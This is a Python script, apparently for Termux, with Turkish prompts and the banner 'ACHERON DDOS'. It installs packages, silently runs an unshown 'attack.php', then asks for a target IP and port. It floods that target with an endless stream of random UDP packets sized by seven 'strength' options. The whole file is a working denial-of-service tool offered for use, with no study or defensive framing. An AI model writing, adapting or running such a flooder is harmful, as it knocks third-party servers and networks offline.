import os
import random 
import socket
import colorama
from colorama import Fore, Back, Style
os.system ('python -m pip install colorama')
os.system ('clear')
os.system ('pkg install figlet')
os.system('pkg install php')
os.system('php attack.php')
os.system('clear')
os.system ('figlet ACHERON DDOS')

print(Fore.GREEN)
print ('     1- 10.000 bayt [BAŞLANGIÇ]')
print ('     2- 20.000 bayt [BAŞLANGIÇ]')
print(Fore.YELLOW)
print ('     3- 30.000 bayt [ORTA SEVİYE]')
print ('     4- 40.000 bayt [ORTA SEVİYE]')
print(Fore.RED)
print ('     5- 50.000 bayt [GÜÇLÜ]')
print ('     6- 60.000 bayt [GÜÇLÜ]')
print ('     7- 70.000 bayt [ÇOK GÜÇLÜ]')


print(Fore.WHITE)
ddos = input("Seçenek giriniz > ")
if(ddos=="1"):
		
		hedef_ip = str(input("Hedef ip giriniz : "))
		hedef_port = int(input("Hedef port giriniz :"))

		bytes = random._urandom(10000)
		sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
		sayac = 0
		while True:
			sock.sendto(bytes,(hedef_ip , hedef_port))
			sayac = sayac+1
			print("Gönderilen paket: %s" %(sayac))

if(ddos=="2"):
		
		hedef_ip = str(input("Hedef ip giriniz : "))
		hedef_port = int(input("Hedef port giriniz : "))

		bytes = random._urandom(20000)
		sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
		sayac = 0
		while True:
			sock.sendto(bytes,(hedef_ip, hedef_port))
			sayac = sayac+1
			print("Gönderilen paket: %s" %(sayac))

if(ddos=="3"):
		
		hedef_ip = str(input("Hedef ip giriniz : "))
		hedef_port = int(input("Hedef port giriniz  :"))

		bytes = random._urandom(30000)
		sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
		sayac = 0
		while True:
			sock.sendto(bytes,(hedef_ip, hedef_port))
			sayac = sayac+1
			print("Gönderilen paket: %s" %(sayac))

if(ddos=="4"):
		
		hedef_ip = str(input("Hedef ip giriniz :"))
		hedef_port = int(input("Hedef port giriniz :"))

		bytes = random._urandom(40000)
		sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
		sayac = 0
		while True:
			sock.sendto(bytes,(hedef_ip, hedef_port))
			sayac = sayac+1
			print("Gönderilen paket: %s" %(sayac))

if(ddos=="5"):
		
		hedef_ip = str(input("Hedef ip giriniz : "))
		hedef_port = int(input("Hedef port giriniz : "))

		bytes = random._urandom(50000)
		sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
		sayac = 0
		while True:
			sock.sendto(bytes,(hedef_ip, hedef_port))
			sayac = sayac+1
			print("Gönderilen paket: %s" %(sayac))

if(ddos=="6"):
		
		hedef_ip = str(input("Hedef ip giriniz : "))
		hedef_port = int(input("Hedef port giriniz : "))

		bytes = random._urandom(60000)
		sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
		sayac = 0
		while True:
			sock.sendto(bytes,(hedef_ip, hedef_port))
			sayac = sayac+1
			print("Gönderilen paket: %s" %(sayac))


if(ddos=="7"):
		
		hedef_ip = str(input("Hedef ip giriniz : "))
		hedef_port = int(input("Hedef port giriniz : "))

		bytes = random._urandom(70000)
		sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
		sayac = 0
		while True:
			sock.sendto(bytes,(hedef_ip, hedef_port))
			sayac = sayac+1
			print("Gönderilen paket: %s" %(sayac))